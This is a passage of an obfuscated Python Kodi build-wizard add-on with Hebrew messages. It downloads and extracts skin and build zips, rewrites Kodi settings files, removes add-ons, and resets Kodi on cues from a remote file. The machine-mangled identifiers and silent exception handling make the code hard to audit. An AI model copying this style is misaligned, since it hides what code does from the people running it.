						OOOOO0OOO00O00OO0 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:4135
						os .rename (O0000O00O000OOOOO ,OOOOO0OOO00O00OO0 )#line:4136
					except :#line:4137
						pass #line:4138
					try :#line:4139
						OO0O0O000O0O0O000 =open (os .path .join (ADDONS ,SKINID18 ,'addon.xml'),mode ='r');OO0O0OO000O00OO00 =OO0O0O000O0O0O000 .read ();OO0O0O000O0O0O000 .close ()#line:4140
						OO0OOO0O00OO0O0O0 =wiz .parseDOM (OO0O0OO000O00OO00 ,'addon',ret ='name',attrs ={'id':SKINID18 })#line:4141
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO0OOO0O00OO0O0O0 [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID18 ,'icon.png'))#line:4142
					except :#line:4143
						pass #line:4144
					if KODIV >=17 :wiz .addonDatabase (SKINID18 ,1 )#line:4145
					DP .close ()#line:4146
					xbmc .sleep (500 )#line:4147
					wiz .forceUpdate (True )#line:4148
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:4149
				else :#line:4150
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:4151
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%O0O0OOOOOO0OOOO0O ,xbmc .LOGERROR )#line:4152
			else :#line:4153
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:4154
		else :#line:4155
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:4156
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:4157
def skinfix17 ():#line:4158
	if KODIV >=17 and KODIV <18 and os .path .exists (os .path .join (ADDONS ,SKINID17 )):#line:4159
		O00OO0O0OO000OOO0 =wiz .workingURL (SKINID17DDONXML )#line:4160
		if O00OO0O0OO000OOO0 ==True :#line:4161
			OOO0OOO0OO0OOOOO0 =wiz .parseDOM (wiz .openURL (SKINID17DDONXML ),'addon',ret ='version',attrs ={'id':SKINID17 })#line:4162
			if len (OOO0OOO0OO0OOOOO0 )>0 :#line:4163
				OO0O00OOOOOO000OO ='%s-%s.zip'%(SKINID17 ,OOO0OOO0OO0OOOOO0 [0 ])#line:4164
				OOOOOO0OOO0O00OOO =wiz .workingURL (SKIN17ZIPURL +OO0O00OOOOOO000OO )#line:4165
				if OOOOOO0OOO0O00OOO ==True :#line:4166
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:4167
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4168
					OO000OO0OO0OO0OOO =os .path .join (PACKAGES ,OO0O00OOOOOO000OO )#line:4169
					try :os .remove (OO000OO0OO0OO0OOO )#line:4170
					except :pass #line:4171
					downloader .download (SKIN17ZIPURL +OO0O00OOOOOO000OO ,OO000OO0OO0OO0OOO ,DP )#line:4172
					extract .all (OO000OO0OO0OO0OOO ,HOME ,DP )#line:4173
					try :#line:4174
						OOO0O0OOO00O00OO0 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:4175
						O0OOOO0O0O000OOOO =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:4176
						os .rename (OOO0O0OOO00O00OO0 ,O0OOOO0O0O000OOOO )#line:4177
					except :#line:4178
						pass #line:4179
					try :#line:4180
						OO0O000OOO000OOO0 =open (os .path .join (ADDONS ,SKINID17 ,'addon.xml'),mode ='r');OOO00OOOOOOOOO0OO =OO0O000OOO000OOO0 .read ();OO0O000OOO000OOO0 .close ()#line:4181
						O00000OOO0000O00O =wiz .parseDOM (OOO00OOOOOOOOO0OO ,'addon',ret ='name',attrs ={'id':SKINID17 })#line:4182
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,O00000OOO0000O00O [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID17 ,'icon.png'))#line:4183
					except :#line:4184
						pass #line:4185
					if KODIV >=17 :wiz .addonDatabase (SKINID17 ,1 )#line:4186
					DP .close ()#line:4187
					xbmc .sleep (500 )#line:4188
					wiz .forceUpdate (True )#line:4189
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:4190
				else :#line:4191
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:4192
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%OOOOOO0OOO0O00OOO ,xbmc .LOGERROR )#line:4193
			else :#line:4194
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:4195
		else :#line:4196
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:4197
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:4198
def fix17update ():#line:4199
	if KODIV >=17 and KODIV <18 :#line:4200
		wiz .kodi17Fix ()#line:4201
		xbmc .sleep (4000 )#line:4202
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:4203
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:4204
		fixfont ()#line:4205
		OO0000OO0OOOO0OO0 =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:4206
		try :#line:4208
			O000OOOOOOOOO00OO =open (OO0000OO0OOOO0OO0 ,'r')#line:4209
			O0O0O0OOOOO00O0OO =O000OOOOOOOOO00OO .read ()#line:4210
			O000OOOOOOOOO00OO .close ()#line:4211
			O000O0O000000OOO0 ='<import addon="xbmc.gui" version="5.14.0(.+?)/>'#line:4212
			OOOO0O0000000OO0O =re .compile (O000O0O000000OOO0 ).findall (O0O0O0OOOOO00O0OO )[0 ]#line:4213
			O000OOOOOOOOO00OO =open (OO0000OO0OOOO0OO0 ,'w')#line:4214
			O000OOOOOOOOO00OO .write (O0O0O0OOOOO00O0OO .replace ('<import addon="xbmc.gui" version="5.14.0%s/>'%OOOO0O0000000OO0O ,'<import addon="xbmc.gui" version="5.12.0"/>'))#line:4215
			O000OOOOOOOOO00OO .close ()#line:4216
		except :#line:4217
				pass #line:4218
		wiz .kodi17Fix ()#line:4219
		OO0000OO0OOOO0OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:4220
		try :#line:4221
			O000OOOOOOOOO00OO =open (OO0000OO0OOOO0OO0 ,'r')#line:4222
			O0O0O0OOOOO00O0OO =O000OOOOOOOOO00OO .read ()#line:4223
			O000OOOOOOOOO00OO .close ()#line:4224
			O000O0O000000OOO0 ='<keyboardlayouts default="true(.+?)/keyboardlayouts>'#line:4225
			OOOO0O0000000OO0O =re .compile (O000O0O000000OOO0 ).findall (O0O0O0OOOOO00O0OO )[0 ]#line:4226
			O000OOOOOOOOO00OO =open (OO0000OO0OOOO0OO0 ,'w')#line:4227
			O000OOOOOOOOO00OO .write (O0O0O0OOOOO00O0OO .replace ('<keyboardlayouts default="true%s/keyboardlayouts>'%OOOO0O0000000OO0O ,'<keyboardlayouts>English QWERTY|Hebrew QWERTY</keyboardlayouts>'))#line:4228
			O000OOOOOOOOO00OO .close ()#line:4229
		except :#line:4230
				pass #line:4231
		swapSkins ('skin.Premium.mod')#line:4232
def fix18update ():#line:4234
	if KODIV >=18 :#line:4235
		xbmc .sleep (4000 )#line:4236
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:4237
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:4238
		fixfont ()#line:4239
		O00OO0O0O0O0OOOOO =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:4240
		try :#line:4241
			OOO000O00OOO00O00 =open (O00OO0O0O0O0OOOOO ,'r')#line:4242
			O00O000000OO00000 =OOO000O00OOO00O00 .read ()#line:4243
			OOO000O00OOO00O00 .close ()#line:4244
			OOO00OO0O00O00OO0 ='<import addon="xbmc.gui" version="5.12.0(.+?)/>'#line:4245
			OOOOO0O0O000OOOOO =re .compile (OOO00OO0O00O00OO0 ).findall (O00O000000OO00000 )[0 ]#line:4246
			OOO000O00OOO00O00 =open (O00OO0O0O0O0OOOOO ,'w')#line:4247
			OOO000O00OOO00O00 .write (O00O000000OO00000 .replace ('<import addon="xbmc.gui" version="5.12.0%s/>'%OOOOO0O0O000OOOOO ,'<import addon="xbmc.gui" version="5.14.0"/>'))#line:4248
			OOO000O00OOO00O00 .close ()#line:4249
		except :#line:4250
				pass #line:4251
		wiz .kodi17Fix ()#line:4252
		O00OO0O0O0O0OOOOO =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:4253
		try :#line:4254
			OOO000O00OOO00O00 =open (O00OO0O0O0O0OOOOO ,'r')#line:4255
			O00O000000OO00000 =OOO000O00OOO00O00 .read ()#line:4256
			OOO000O00OOO00O00 .close ()#line:4257
			OOO00OO0O00O00OO0 ='<setting id="locale.keyboardlayouts" default="true(.+?)/setting>'#line:4258
			OOOOO0O0O000OOOOO =re .compile (OOO00OO0O00O00OO0 ).findall (O00O000000OO00000 )[0 ]#line:4259
			OOO000O00OOO00O00 =open (O00OO0O0O0O0OOOOO ,'w')#line:4260
			OOO000O00OOO00O00 .write (O00O000000OO00000 .replace ('<setting id="locale.keyboardlayouts" default="true%s/setting>'%OOOOO0O0O000OOOOO ,'<setting id="locale.keyboardlayouts">English QWERTY|Hebrew QWERTY</setting>'))#line:4261
			OOO000O00OOO00O00 .close ()#line:4262
		except :#line:4263
				pass #line:4264
		swapSkins ('skin.Premium.mod')#line:4265
def buildWizard (O00000O0O0OOO0OO0 ,O0OO0O00OOOOOO0O0 ,theme =None ,over =False ):#line:4268
	O0000OOO000O00OOO =xbmcgui .DialogBusy ()#line:4269
	O0000OOO000O00OOO .create ()#line:4270
	if over ==False :#line:4271
		O00OO00OOOO000OOO =wiz .checkBuild (O00000O0O0OOO0OO0 ,'url')#line:4272
		if USERNAME =='':#line:4273
			ADDON .openSettings ()#line:4274
			sys .exit ()#line:4275
		if PASSWORD =='':#line:4276
			ADDON .openSettings ()#line:4277
			sys .exit ()#line:4278
		if BUILDNAME =='':#line:4280
			O000O000OO000O000 =u_list (SPEEDFILE )#line:4281
			(O000O000OO000O000 )#line:4282
		if O00OO00OOOO000OOO ==False :#line:4283
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]אנא המתן...[/COLOR]'%COLOR2 )#line:4288
			xbmc .executebuiltin ("RunPlugin(plugin://plugin.program.EA4all/?mode=install&name=+Kodi+Premium&url=gui)")#line:4289
			return #line:4290
		O00O00000O0OOO000 =wiz .workingURL (O00OO00OOOO000OOO )#line:4291
		if O00O00000O0OOO000 ==False :#line:4292
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Build Zip Error: %s[/COLOR]"%(COLOR2 ,O00O00000O0OOO000 ))#line:4293
			return #line:4294
	if O0OO0O00OOOOOO0O0 =='gui':#line:4295
		if O00000O0O0OOO0OO0 ==BUILDNAME :#line:4296
			if over ==True :O00000000O000O0OO =1 #line:4297
			else :O00000000O000O0OO =1 #line:4298
		else :#line:4299
			O00000000O000O0OO =1 #line:4300
		if O00000000O000O0OO :#line:4301
			remove_addons ()#line:4302
			remove_addons2 ()#line:4303
			debridit .debridIt ('update','all')#line:4304
			traktit .traktIt ('update','all')#line:4305
			O000OOO0O00OOOOOO =wiz .checkBuild (O00000O0O0OOO0OO0 ,'gui')#line:4306
			O0OO0O000OO0OOO00 =O00000O0O0OOO0OO0 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4307
			if not wiz .workingURL (O000OOO0O00OOOOOO )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:4308
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4309
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00000O0O0OOO0OO0 ),'','אנא המתן')#line:4310
			OO00000O00O0O0OO0 =os .path .join (PACKAGES ,'%s_guisettings.zip'%O0OO0O000OO0OOO00 )#line:4311
			try :os .remove (OO00000O00O0O0OO0 )#line:4312
			except :pass #line:4313
			logging .warning (O000OOO0O00OOOOOO )#line:4314
			if 'google'in O000OOO0O00OOOOOO :#line:4315
			   OOOOO0O0O000O00O0 =googledrive_download (O000OOO0O00OOOOOO ,OO00000O00O0O0OO0 ,DP ,wiz .checkBuild (O00000O0O0OOO0OO0 ,'filesize'))#line:4316
			else :#line:4319
			  downloader .download (O000OOO0O00OOOOOO ,OO00000O00O0O0OO0 ,DP )#line:4320
			xbmc .sleep (100 )#line:4321
			OO000O0OO000O000O ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00000O0O0OOO0OO0 )#line:4322
			DP .update (0 ,OO000O0OO000O000O ,'','אנא המתן')#line:4323
			extract .all (OO00000O00O0O0OO0 ,HOME ,DP ,title =OO000O0OO000O000O )#line:4324
			DP .close ()#line:4325
			wiz .defaultSkin ()#line:4326
			wiz .lookandFeelData ('save')#line:4327
			try :#line:4328
				telemedia_android5fix ()#line:4329
			except :pass #line:4330
			wiz .kodi17Fix ()#line:4331
			if KODIV >=18 :#line:4332
				skindialogsettind18 ()#line:4333
			debridit .debridIt ('restore','all')#line:4334
			traktit .traktIt ('restore','all')#line:4335
			if INSTALLMETHOD ==1 :OOO0OOO00OO00OO00 =1 #line:4337
			elif INSTALLMETHOD ==2 :OOO0OOO00OO00OO00 =0 #line:4338
			else :DP .close ()#line:4339
			OOO0000O000000O0O =(NOTIFICATION2 )#line:4340
			O0OOOOO0O00O0O0OO =urllib2 .urlopen (OOO0000O000000O0O )#line:4341
			O00OOOO0OOO00O0O0 =O0OOOOO0O00O0O0OO .readlines ()#line:4342
			OOOOOOOO00OOOOO00 =0 #line:4343
			for OOOO000O00O00OO00 in O00OOOO0OOO00O0O0 :#line:4346
				if OOOO000O00O00OO00 .split (' ==')[0 ]=="noreset"or OOOO000O00O00OO00 .split ()[0 ]=="noreset":#line:4347
					xbmc .executebuiltin ("ReloadSkin()")#line:4349
					wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הבילד עודכן בהצלחה![/COLOR]'%COLOR2 )#line:4350
					update_Votes ()#line:4351
					indicatorfastupdate ()#line:4352
				if OOOO000O00O00OO00 .split (' ==')[0 ]=="reset"or OOOO000O00O00OO00 .split ()[0 ]=="reset":#line:4353
					update_Votes ()#line:4355
					indicatorfastupdate ()#line:4356
					resetkodi ()#line:4357
		else :#line:4366
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:4367
	if O0OO0O00OOOOOO0O0 =='gui2':#line:4368
		if O00000O0O0OOO0OO0 ==BUILDNAME :#line:4369
			if over ==True :O00000000O000O0OO =1 #line:4370
			else :O00000000O000O0OO =1 #line:4371
		else :#line:4372
			O00000000O000O0OO =1 #line:4373
		if O00000000O000O0OO :#line:4374
			remove_addons ()#line:4375
			remove_addons2 ()#line:4376
			O000OOO0O00OOOOOO =wiz .checkBuild (O00000O0O0OOO0OO0 ,'gui')#line:4377
			O0OO0O000OO0OOO00 =O00000O0O0OOO0OO0 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4378
			if not wiz .workingURL (O000OOO0O00OOOOOO )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:4379
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4380
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00000O0O0OOO0OO0 ),'','אנא המתן')#line:4381
			OO00000O00O0O0OO0 =os .path .join (PACKAGES ,'%s_guisettings.zip'%O0OO0O000OO0OOO00 )#line:4382
			try :os .remove (OO00000O00O0O0OO0 )#line:4383
			except :pass #line:4384
			logging .warning (O000OOO0O00OOOOOO )#line:4385
			if 'google'in O000OOO0O00OOOOOO :#line:4386
			   OOOOO0O0O000O00O0 =googledrive_download (O000OOO0O00OOOOOO ,OO00000O00O0O0OO0 ,DP ,wiz .checkBuild (O00000O0O0OOO0OO0 ,'filesize'))#line:4387
			else :#line:4390
			  downloader .download (O000OOO0O00OOOOOO ,OO00000O00O0O0OO0 ,DP )#line:4391
			xbmc .sleep (100 )#line:4392
			OO000O0OO000O000O ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00000O0O0OOO0OO0 )#line:4393
			DP .update (0 ,OO000O0OO000O000O ,'','אנא המתן')#line:4394
			extract .all (OO00000O00O0O0OO0 ,HOME ,DP ,title =OO000O0OO000O000O )#line:4395
			DP .close ()#line:4396
			wiz .defaultSkin ()#line:4397
			wiz .lookandFeelData ('save')#line:4398
			if INSTALLMETHOD ==1 :OOO0OOO00OO00OO00 =1 #line:4401
			elif INSTALLMETHOD ==2 :OOO0OOO00OO00OO00 =0 #line:4402
			else :DP .close ()#line:4403
		else :#line:4405
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:4406
	elif O0OO0O00OOOOOO0O0 =='fresh':#line:4407
		freshStart (O00000O0O0OOO0OO0 )#line:4408
	elif O0OO0O00OOOOOO0O0 =='normal':#line:4409
		if url =='normal':#line:4410
			if KEEPTRAKT =='true':#line:4411
				traktit .autoUpdate ('all')#line:4412
				wiz .setS ('traktlastsave',str (THREEDAYS ))#line:4413
			if KEEPREAL =='true':#line:4414
				debridit .autoUpdate ('all')#line:4415
				wiz .setS ('debridlastsave',str (THREEDAYS ))#line:4416
			if KEEPLOGIN =='true':#line:4417
				loginit .autoUpdate ('all')#line:4418
				wiz .setS ('loginlastsave',str (THREEDAYS ))#line:4419
		O0O0O0OOOO000O000 =int (KODIV );O0O0O00O0O0000OO0 =int (float (wiz .checkBuild (O00000O0O0OOO0OO0 ,'kodi')))#line:4420
		if not O0O0O0OOOO000O000 ==O0O0O00O0O0000OO0 :#line:4421
			if O0O0O0OOOO000O000 ==16 and O0O0O00O0O0000OO0 <=15 :OO0OO00O0OO000OO0 =False #line:4422
			else :OO0OO00O0OO000OO0 =True #line:4423
		else :OO0OO00O0OO000OO0 =False #line:4424
		if OO0OO00O0OO000OO0 ==True :#line:4425
			O0OOO0OOOOOO0O0OO =1 #line:4426
		else :#line:4427
			if not over ==False :O0OOO0OOOOOO0O0OO =1 #line:4428
			else :O0OOO0OOOOOO0O0OO =DIALOG .yesno (ADDONTITLE ,'התקנה רגילה:','מצב זה שומר הרחבות קיימות, האם להמשיך?',nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4429
		if O0OOO0OOOOOO0O0OO :#line:4430
			wiz .clearS ('build')#line:4431
			O000OOO0O00OOOOOO =wiz .checkBuild (O00000O0O0OOO0OO0 ,'url')#line:4432
			O0OO0O000OO0OOO00 =O00000O0O0OOO0OO0 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4433
			if not wiz .workingURL (O000OOO0O00OOOOOO )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Build Install: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:4434
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4435
			DP .create (ADDONTITLE ,'[COLOR %s][B][/B][/COLOR] [COLOR %s]%s v%s[/COLOR][B]מוריד[/B]'%(COLOR2 ,COLOR1 ,O00000O0O0OOO0OO0 ,wiz .checkBuild (O00000O0O0OOO0OO0 ,'version')),'','אנא המתן')#line:4436
			OO00000O00O0O0OO0 =os .path .join (PACKAGES ,'%s.zip'%O0OO0O000OO0OOO00 )#line:4437
			try :os .remove (OO00000O00O0O0OO0 )#line:4438
			except :pass #line:4439
			logging .warning (O000OOO0O00OOOOOO )#line:4440
			if 'google'in O000OOO0O00OOOOOO :#line:4441
			   OOOOO0O0O000O00O0 =googledrive_download (O000OOO0O00OOOOOO ,OO00000O00O0O0OO0 ,DP ,wiz .checkBuild (O00000O0O0OOO0OO0 ,'filesize'))#line:4442
			else :#line:4445
			  downloader .download (O000OOO0O00OOOOOO ,OO00000O00O0O0OO0 ,DP )#line:4446
			xbmc .sleep (1000 )#line:4447
			OO000O0OO000O000O ='[COLOR %s][B][/B][/COLOR] [COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00000O0O0OOO0OO0 ,wiz .checkBuild (O00000O0O0OOO0OO0 ,'version'))#line:4448
			DP .update (0 ,OO000O0OO000O000O ,'','אנא המתן...')#line:4449
			OOO0OOOOOO00OOOOO ,O0O0OOOO0O00000OO ,OO0O0OOO0OO0OOO0O =extract .all (OO00000O00O0O0OO0 ,HOME ,DP ,title =OO000O0OO000O000O )#line:4450
			if int (float (OOO0OOOOOO00OOOOO ))>0 :#line:4451
				try :#line:4452
					wiz .fixmetas ()#line:4453
				except :pass #line:4454
				wiz .lookandFeelData ('save')#line:4455
				wiz .defaultSkin ()#line:4456
				wiz .setS ('buildname',O00000O0O0OOO0OO0 )#line:4458
				wiz .setS ('buildversion',wiz .checkBuild (O00000O0O0OOO0OO0 ,'version'))#line:4459
				wiz .setS ('buildtheme','')#line:4460
				wiz .setS ('latestversion',wiz .checkBuild (O00000O0O0OOO0OO0 ,'version'))#line:4461
				wiz .setS ('lastbuildcheck',str (NEXTCHECK ))#line:4462
				wiz .setS ('installed','true')#line:4463
				wiz .setS ('extract',str (OOO0OOOOOO00OOOOO ))#line:4464
				wiz .setS ('errors',str (O0O0OOOO0O00000OO ))#line:4465
				wiz .log ('INSTALLED %s: [ERRORS:%s]'%(OOO0OOOOOO00OOOOO ,O0O0OOOO0O00000OO ))#line:4466
				fastupdatefirstbuild (NOTEID )#line:4467
				try :#line:4468
					telemedia_android5fix ()#line:4469
				except :pass #line:4470
				wiz .kodi17Fix ()#line:4471
				skin_homeselect ()#line:4472
				kodi17to18 ()#line:4478
				try :os .remove (OO00000O00O0O0OO0 )#line:4480
				except :pass #line:4481
				DP .close ()#line:4501
				O0O0OO000OOOOO00O =wiz .themeCount (O00000O0O0OOO0OO0 )#line:4502
				builde_Votes ()#line:4503
				indicator ()#line:4504
				if not O0O0OO000OOOOO00O ==False :#line:4505
					buildWizard (O00000O0O0OOO0OO0 ,'theme')#line:4506
				if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:4507
				if INSTALLMETHOD ==1 :OOO0OOO00OO00OO00 =1 #line:4508
				elif INSTALLMETHOD ==2 :OOO0OOO00OO00OO00 =0 #line:4509
				else :resetkodi ()#line:4510
				if OOO0OOO00OO00OO00 ==1 :wiz .reloadFix ()#line:4512
				else :wiz .killxbmc (True )#line:4513
			else :#line:4514
				if isinstance (O0O0OOOO0O00000OO ,unicode ):#line:4515
					OO0O0OOO0OO0OOO0O =OO0O0OOO0OO0OOO0O .encode ('utf-8')#line:4516
				OO0O00OO0O0OOOO00 =open (OO00000O00O0O0OO0 ,'r')#line:4517
				OOOO000000OOOOOO0 =OO0O00OO0O0OOOO00 .read ()#line:4518
				OO0OOO000OO0O0OOO =''#line:4519
				for O0OO000OO00000OOO in OOOOO0O0O000O00O0 :#line:4520
				  OO0OOO000OO0O0OOO ='key: '+OO0OOO000OO0O0OOO +'\n'+O0OO000OO00000OOO #line:4521
				wiz .TextBox ("%s: בעיה בהתקנת הבילד"%ADDONTITLE ,OO0O0OOO0OO0OOO0O +'לפתרון הבעיה יש לשנות את התאריך במכשיר ליום אחד קודם.'+OO0OOO000OO0O0OOO )#line:4522
		else :#line:4523
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנת הבילד: מבוטלת![/COLOR]'%COLOR2 )#line:4524
	elif O0OO0O00OOOOOO0O0 =='theme':#line:4525
		if theme ==None :#line:4526
			O0O0OO000OOOOO00O =wiz .checkBuild (O00000O0O0OOO0OO0 ,'theme')#line:4527
			OO0OO00OO000OOO00 =[]#line:4528
			if not O0O0OO000OOOOO00O =='http://'and wiz .workingURL (O0O0OO000OOOOO00O )==True :#line:4529
				OO0OO00OO000OOO00 =wiz .themeCount (O00000O0O0OOO0OO0 ,False )#line:4530
				if len (OO0OO00OO000OOO00 )>0 :#line:4531
					if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]The Build [COLOR %s]%s[/COLOR] comes with [COLOR %s]%s[/COLOR] different themes"%(COLOR2 ,COLOR1 ,O00000O0O0OOO0OO0 ,COLOR1 ,len (OO0OO00OO000OOO00 )),"Would you like to install one now?[/COLOR]",yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]"):#line:4532
						wiz .log ("Theme List: %s "%str (OO0OO00OO000OOO00 ))#line:4533
						OO0O00OOO0O0O0OOO =DIALOG .select (ADDONTITLE ,OO0OO00OO000OOO00 )#line:4534
						wiz .log ("Theme install selected: %s"%OO0O00OOO0O0O0OOO )#line:4535
						if not OO0O00OOO0O0O0OOO ==-1 :theme =OO0OO00OO000OOO00 [OO0O00OOO0O0O0OOO ];OO0OO00O00OOO00O0 =True #line:4536
						else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:4537
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:4538
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: None Found![/COLOR]'%COLOR2 )#line:4539
		else :OO0OO00O00OOO00O0 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to install the theme:'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,theme ),'for [COLOR %s]%s v%s[/COLOR]?[/COLOR]'%(COLOR1 ,O00000O0O0OOO0OO0 ,wiz .checkBuild (O00000O0O0OOO0OO0 ,'version')),yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]")#line:4540
		if OO0OO00O00OOO00O0 :#line:4541
			O000OO0O0O00O0OOO =wiz .checkTheme (O00000O0O0OOO0OO0 ,theme ,'url')#line:4542
			O0OO0O000OO0OOO00 =O00000O0O0OOO0OO0 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4543
			if not wiz .workingURL (O000OO0O0O00O0OOO )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Invalid Zip Url![/COLOR]'%COLOR2 );return False #line:4544
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4545
			DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme ),'','Please Wait')#line:4546
			OO00000O00O0O0OO0 =os .path .join (PACKAGES ,'%s.zip'%O0OO0O000OO0OOO00 )#line:4547
			try :os .remove (OO00000O00O0O0OO0 )#line:4548
			except :pass #line:4549
			downloader .download (O000OO0O0O00O0OOO ,OO00000O00O0O0OO0 ,DP )#line:4550
			xbmc .sleep (1000 )#line:4551
			DP .update (0 ,"","Installing %s "%O00000O0O0OOO0OO0 )#line:4552
			O0O000OOO0O0O00O0 =False #line:4553
			if url not in ["fresh","normal"]:#line:4554
				O0O000OOO0O0O00O0 =testTheme (OO00000O00O0O0OO0 )if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']else False #line:4555
